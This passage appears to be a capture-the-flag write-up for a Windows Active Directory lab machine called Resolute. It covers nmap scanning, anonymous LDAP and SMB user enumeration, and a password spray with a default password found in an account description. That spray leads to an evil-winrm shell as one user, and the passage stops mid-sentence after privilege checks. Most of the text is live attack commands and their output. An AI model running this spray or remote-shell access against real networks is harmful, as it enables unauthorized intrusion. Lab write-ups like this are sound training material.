# Resolute (Medium)

# Machine Info
Resolute is a medium-difficulty Windows machine that involves Active Directory enumeration and privilege escalation.

Anonymous LDAP bind reveals a default password used for newly created accounts. Although the original account’s password has changed, a password spray shows that the same password is still valid for another domain user. This grants WinRM access to the system.

A PowerShell transcript log is then discovered, which contains credentials passed on the command line. These credentials are used to move laterally to a user in the `DnsAdmins` group. Members of this group can configure the DNS Server service to load a malicious plugin DLL.

After restarting the DNS service, command execution is achieved on the domain controller as `NT AUTHORITY\SYSTEM`.

# Reconnaissance
## nmap
```
nmap -sCV 10.129.100.9 -o resol.out --min-rate 10000 -p- -Pn                    
Starting Nmap 7.95 ( https://nmap.org ) at 2026-11-04 09:05 EST
Nmap scan report for 10.129.100.9
Host is up (0.067s latency).
Not shown: 65511 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-11-04 14:04:31Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49788/tcp open  msrpc        Microsoft Windows RPC
49817/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-11-04T14:05:24
|_  start_date: 2026-11-04T13:58:20
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2026-11-04T06:05:23-08:00
|_clock-skew: mean: 2h38m35s, deviation: 4h37m09s, median: -1m26s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.80 seconds
```
From namp scan, the hostname `resolute` and the domain `megabank.local` were identified. Both were added both to the `/etc/hosts` file to allow proper name resolution: 
```
10.129.100.9  RESOLUTE.megabank.local megabank.local RESOLUTE
```

# Enumeration
## ldap - TCP 389
```
ldapsearch -x -H ldap://megabank.local -D 'megabank.local' -b 'dc=megabank,dc=local'
```

An anonymous LDAP search revealed detailed domain information, including user accounts and the password `Welcome123!` in a user `Marko Novak` description field.

---
## smb - TCP 445
```
nxc smb 10.129.100.9 --generate-hosts-file smb.hosts  
SMB         10.129.100.9    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) (Null Auth:True)

cat smb.hosts 
10.129.100.9     RESOLUTE.megabank.local megabank.local RESOLUTE
```

I used the command to make sure the hostname and domain both are correct.

---
```
nxc smb 10.129.100.9 -u '' -p '' --shares           
SMB         10.129.100.9    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.100.9    445    RESOLUTE         [+] megabank.local\: 
SMB         10.129.100.9    445    RESOLUTE         [-] Error enumerating shares: STATUS_ACCESS_DENIED

nxc smb 10.129.100.9 -u 'anonymous' -p '' --shares
SMB         10.129.100.9    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\anonymous: STATUS_LOGON_FAILURE

nxc smb 10.129.100.9 -u 'guest' -p '' --shares
SMB         10.129.100.9    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\guest: STATUS_ACCOUNT_DISABLED
```

Null session authentication was accepted, but share listing was denied.
Anonymous login failed, and the guest account was disabled.

---
```
nxc smb 10.129.100.9 -u '' -p '' --users
SMB         10.129.100.9    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.100.9    445    RESOLUTE         [+] megabank.local\: 
SMB         10.129.100.9    445    RESOLUTE         -Username-                    -Last PW Set-       -BadPW- -Description-         
SMB         10.129.100.9    445    RESOLUTE         Administrator                 2026-11-04 14:29:03 0       Built-in account for administering the computer/domain                                                                                                    
SMB         10.129.100.9    445    RESOLUTE         Guest                         <never>             0       Built-in account for guest access to the computer/domain                                                                                                  
SMB         10.129.100.9    445    RESOLUTE         krbtgt                        2019-09-25 13:29:12 0       Key Distribution Center Service Account                                                                                                                   
SMB         10.129.100.9    445    RESOLUTE         DefaultAccount                <never>             0       A user account managed by the system.                                                                                                                     
SMB         10.129.100.9    445    RESOLUTE         ryan                          2026-11-04 14:28:02 0        
SMB         10.129.100.9    445    RESOLUTE         marko                         2019-09-27 13:17:14 0       Account created. Password set to Welcome123!                                                                                                              
SMB         10.129.100.9    445    RESOLUTE         sunita                        2019-12-03 21:26:29 0        
SMB         10.129.100.9    445    RESOLUTE         abigail                       2019-12-03 21:27:30 0        
SMB         10.129.100.9    445    RESOLUTE         marcus                        2019-12-03 21:27:59 0        
SMB         10.129.100.9    445    RESOLUTE         sally                         2019-12-03 21:28:29 0        
SMB         10.129.100.9    445    RESOLUTE         fred                          2019-12-03 21:29:01 0        
SMB         10.129.100.9    445    RESOLUTE         angela                        2019-12-03 21:29:43 0        
SMB         10.129.100.9    445    RESOLUTE         felicia                       2019-12-03 21:30:53 0        
SMB         10.129.100.9    445    RESOLUTE         gustavo                       2019-12-03 21:31:42 0        
SMB         10.129.100.9    445    RESOLUTE         ulf                           2019-12-03 21:32:19 0        
SMB         10.129.100.9    445    RESOLUTE         stevie                        2019-12-03 21:33:13 0        
SMB         10.129.100.9    445    RESOLUTE         claire                        2019-12-03 21:33:44 0        
SMB         10.129.100.9    445    RESOLUTE         paulo                         2019-12-03 21:34:46 0        
SMB         10.129.100.9    445    RESOLUTE         steve                         2019-12-03 21:35:25 0        
SMB         10.129.100.9    445    RESOLUTE         annette                       2019-12-03 21:36:55 0        
SMB         10.129.100.9    445    RESOLUTE         annika                        2019-12-03 21:37:23 0        
SMB         10.129.100.9    445    RESOLUTE         per                           2019-12-03 21:38:12 0        
SMB         10.129.100.9    445    RESOLUTE         claude                        2019-12-03 21:39:56 0        
SMB         10.129.100.9    445    RESOLUTE         melanie                       2026-11-04 14:29:03 0        
SMB         10.129.100.9    445    RESOLUTE         zach                          2019-12-04 10:39:27 0        
SMB         10.129.100.9    445    RESOLUTE         simon                         2019-12-04 10:39:58 0        
SMB         10.129.100.9    445    RESOLUTE         naoki                         2019-12-04 10:40:44 0        
SMB         10.129.100.9    445    RESOLUTE         [*] Enumerated 27 local users: MEGABANK

cat users.txt 
ryan
marko
sunita
abigail
marcus
sally
fred
angela
felicia
gustavo
ulf
stevie
claire
paulo
steve
annette
annika
per
claude
melanie
zach
simon
naoki

cat passwords.txt 
Welcome123!
```

Since null session authentication was accepted, I tried to enumerate users. 
This returned a list of domain users, and the description for the user `marko` indicated that the password was set to `Welcome123!`.

---
```
nxc smb 10.129.100.9 -u users.txt -p passwords.txt --shares 
SMB         10.129.100.9    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\ryan:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\sunita:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\abigail:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\marcus:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\sally:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\fred:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\angela:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\felicia:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\gustavo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\ulf:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\stevie:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\claire:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\paulo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\steve:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\annette:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\annika:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\per:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.100.9    445    RESOLUTE         [+] megabank.local\melanie:Welcome123! 
SMB         10.129.100.9    445    RESOLUTE         [*] Enumerated shares
SMB         10.129.100.9    445    RESOLUTE         Share           Permissions     Remark
SMB         10.129.100.9    445    RESOLUTE         -----           -----------     ------
SMB         10.129.100.9    445    RESOLUTE         ADMIN$                          Remote Admin
SMB         10.129.100.9    445    RESOLUTE         C$                              Default share
SMB         10.129.100.9    445    RESOLUTE         IPC$            READ            Remote IPC
SMB         10.129.100.9    445    RESOLUTE         NETLOGON        READ            Logon server share 
SMB         10.129.100.9    445    RESOLUTE         SYSVOL          READ            Logon server share 
```

Using the enumerated usernames and the password `Welcome123!`, authentication as `melanie` succeeded and allowed enumeration of the available shares.

---
```
smbclient //10.129.100.9/IPC$ -U 'melanie'%'Welcome123!'
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_NO_SUCH_FILE listing \*

smbclient //10.129.100.9/NETLOGON -U 'melanie'%'Welcome123!'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep 25 09:28:21 2019
  ..                                  D        0  Wed Sep 25 09:28:21 2019

smbclient //10.129.100.9/SYSVOL -U 'melanie'%'Welcome123!'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep 25 09:28:21 2019
  ..                                  D        0  Wed Sep 25 09:28:21 2019
  megabank.local                     Dr        0  Wed Sep 25 09:28:21 2019

tree
.
├── megabank.local
│   ├── DfsrPrivate
│   ├── Policies
│   │   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}
│   │   │   ├── GPT.INI
│   │   │   ├── MACHINE
│   │   │   │   ├── Microsoft
│   │   │   │   │   └── Windows NT
│   │   │   │   │       └── SecEdit
│   │   │   │   │           └── GptTmpl.inf
│   │   │   │   └── Scripts
│   │   │   │       ├── Shutdown
│   │   │   │       └── Startup
│   │   │   └── USER
│   │   └── {6AC1786C-016F-11D2-945F-00C04fB984F9}
│   │       ├── GPT.INI
│   │       ├── MACHINE
│   │       │   └── Microsoft
│   │       │       └── Windows NT
│   │       │           └── SecEdit
│   │       │               └── GptTmpl.inf
│   │       └── USER
│   └── scripts
```
All available shares were enumerated, but no interesting files or information were found.

---
## Shell as melanie
```
nxc winrm 10.129.100.9 -u melanie -p 'Welcome123!'
WINRM       10.129.100.9    5985   RESOLUTE         [*] Windows 10 / Server 2016 Build 14393 (name:RESOLUTE) (domain:megabank.local)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.100.9    5985   RESOLUTE         [+] megabank.local\melanie:Welcome123! (Pwn3d!)

evil-winrm -i 10.129.100.9 -u melanie -p 'Welcome123!'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\melanie\Documents> cd ../
ls
*Evil-WinRM* PS C:\Users\melanie> ls


    Directory: C:\Users\melanie


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        12/4/2019   2:47 AM                Desktop
d-r---        12/4/2019   2:46 AM                Documents
d-r---        7/16/2016   6:18 AM                Downloads
d-r---        7/16/2016   6:18 AM                Favorites
d-r---        7/16/2016   6:18 AM                Links
d-r---        7/16/2016   6:18 AM                Music
d-r---        7/16/2016   6:18 AM                Pictures
d-----        7/16/2016   6:18 AM                Saved Games
d-r---        7/16/2016   6:18 AM                Videos


*Evil-WinRM* PS C:\Users\melanie> cd Desktop
ls
*Evil-WinRM* PS C:\Users\melanie\Desktop> ls


    Directory: C:\Users\melanie\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        11/4/2026   5:59 AM             34 user.txt
```

Using the credentials `melanie:Welcome123!`, a WinRM session was successfully established, and the user flag was found on the desktop.

---
```
*Evil-WinRM* PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
*Evil-WinRM* PS C:\> hostname
Resolute
```

Basic 
